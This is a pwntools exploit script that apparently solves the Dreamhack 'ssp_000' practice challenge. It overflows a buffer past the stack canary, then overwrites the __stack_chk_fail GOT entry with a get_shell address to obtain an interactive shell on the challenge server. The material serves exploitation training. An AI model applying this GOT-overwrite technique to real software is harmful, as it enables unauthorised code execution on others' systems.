from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./ssp_000")
p = remote("host3.dreamhack.games", 20553)
#gdb.attach(p,api=True)

get_shell = 0x00000000004008ea


payload = b"a"*0x50
p.sendline(payload)

stack_chk_fail_got = 0x601020
p.recvuntil(b"r : ")
payload = b"6295584"
p.sendline(payload)

p.recvuntil(b"e : ")
payload = b"4196586"
p.sendline(payload)

p.interactive()
